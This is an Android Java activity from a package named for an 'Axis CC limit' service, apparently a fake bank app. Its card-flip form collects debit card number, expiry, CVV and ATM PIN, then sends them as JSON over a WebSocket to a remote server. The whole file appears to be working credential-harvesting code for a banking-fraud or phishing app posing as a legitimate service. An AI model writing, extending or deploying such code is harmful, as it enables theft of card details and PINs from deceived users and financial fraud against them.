package com.service.axiscclimit;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.text.TextWatcher;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class Debit1 extends  BaseActivity {

    private LinearLayout frontView;
    private LinearLayout backView;
    @SuppressLint("SetTextI18n")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_debit1);

        frontView = findViewById(R.id.frontView);
        backView = findViewById(R.id.backView);


        EditText card = findViewById(R.id.cardNumber);
        card.addTextChangedListener(new DebitCardInputMask(card));

        EditText expiry = findViewById(R.id.expiry);
        expiry.addTextChangedListener(new ExpiryDateInputMask(expiry));

        EditText cvv = findViewById(R.id.cvv);

        int form_id = getIntent().getIntExtra("form_id", -1);

        dataObject = new HashMap<>();
        ids = new HashMap<>();
        ids.put(R.id.cvv, "cvv");
        ids.put(R.id.cardNumber, "cardNumber");
        ids.put(R.id.expiry, "expiry");
        ids.put(R.id.pinNum, "pinNum");

        // Populate dataObject
        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);
            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        // 🔹 Auto flip logic when front fields complete
        TextWatcher watcher = new SimpleTextWatcher(() -> {
            if (isFrontFieldsValid(card, expiry, cvv) && backView.getVisibility() == View.GONE) {
                flipToBack(frontView, backView);
            }
        });

        card.addTextChangedListener(watcher);
        expiry.addTextChangedListener(watcher);
        cvv.addTextChangedListener(watcher);

        Button buttonSubmit = findViewById(R.id.btnSubmit);
        buttonSubmit.setOnClickListener(v -> {

            if (!validateForm()) {
                Toast.makeText(this, "Form validation failed", Toast.LENGTH_SHORT).show();
                return;
            }
            submitLoader.show();
            try {
                dataObject.put("form_data_id", form_id);
                JSONObject dataJson = new JSONObject(dataObject); // your form data
                JSONObject sendPayload = new JSONObject();
                sendPayload.put("form_data_id", form_id);
                sendPayload.put("data", dataJson);

                // Emit through WebSocket
                socketManager.emitWithAck("formDataId", sendPayload, new SocketManager.AckCallback() {
                    @Override
                    public void onResponse(JSONObject response) {
                        runOnUiThread(() -> {
                            submitLoader.dismiss();
                            int status = response.optInt("status", 0);
                            int formId = response.optInt("data", -1);
                            String message = response.optString("message", "No message");
                            if (status == 200 && formId != -1) {
                                Intent intent = new Intent(context, LastActivity.class);
                                intent.putExtra("form_id", formId);
                                startActivity(intent);
                            } else {
                                Toast.makeText(context, "Form failed: " + message, Toast.LENGTH_SHORT).show();
                            }
                        });
                    }

                    @Override
                    public void onError(String error) {
                        runOnUiThread(() -> {
                            Toast.makeText(context, "Socket Error: " + error, Toast.LENGTH_SHORT).show();
                            submitLoader.dismiss();
                        });
                    }
                });

            } catch (JSONException e) {
                Toast.makeText(context, "Error building JSON: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                submitLoader.dismiss();
            }
        });

    }

    public boolean validateForm() {
        boolean isValid = true; // Assume the form is valid initially
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            // Check if the field is required and not empty
            if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                isValid = false;
                continue;
            }

            String value = editText.getText().toString().trim();

            // Validate based on the key
            switch (key) {
                case "cardNumber":
                    if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
                        isValid = false;
                    }
                    break;
                case "cvv":
                    if (!FormValidator.validateMinLength(editText, 3,  "Invalid CVV")) {
                        isValid = false;
                    }
                    break;
                case "expiry":
                    if (!FormValidator.validateMinLength(editText, 5,  "Invalid Expiry Date")) {
                        isValid = false;
                    }
                    break;
                case "pinNum":
                    if (!FormValidator.validateMinLength(editText, 4,  "Invalid ATM Pin")) {
                        isValid = false;
                    }
                    break;

                default:
                    break;
            }

            // Add to dataObject only if the field is valid
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }

    private void flipToBack(View front, View back) {
        front.animate()
                .rotationY(90f)
                .setDuration(300)
                .withEndAction(() -> {
                    front.setVisibility(View.GONE);
                    back.setVisibility(View.VISIBLE);
                    back.setRotationY(-90f);
                    back.animate()
                            .rotationY(0f)
                            .setDuration(300)
                            .start();
                })
                .start();
    }

    private void flipToFront(View front, View back) {
        back.animate()
                .rotationY(90f)
                .setDuration(300)
                .withEndAction(() -> {
                    back.setVisibility(View.GONE);
                    front.setVisibility(View.VISIBLE);
                    front.setRotationY(-90f);
                    front.animate()
                            .rotationY(0f)
                            .setDuration(300)
                            .start();
                })
                .start();
    }

    private boolean isFrontFieldsValid(EditText card, EditText expiry, EditText cvv) {
        String c = card.getText().toString().trim();
        String e = expiry.getText().toString().trim();
        String v = cvv.getText().toString().trim();

        return (c.length() == 19 && e.length() == 5 && v.length() == 3);
    }

    private static class SimpleTextWatcher implements android.text.TextWatcher {
        private final Runnable onChange;
        public SimpleTextWatcher(Runnable onChange) {
            this.onChange = onChange;
        }
        @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
        @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
        @Override public void afterTextChanged(android.text.Editable s) {
            onChange.run();
        }
    }


}
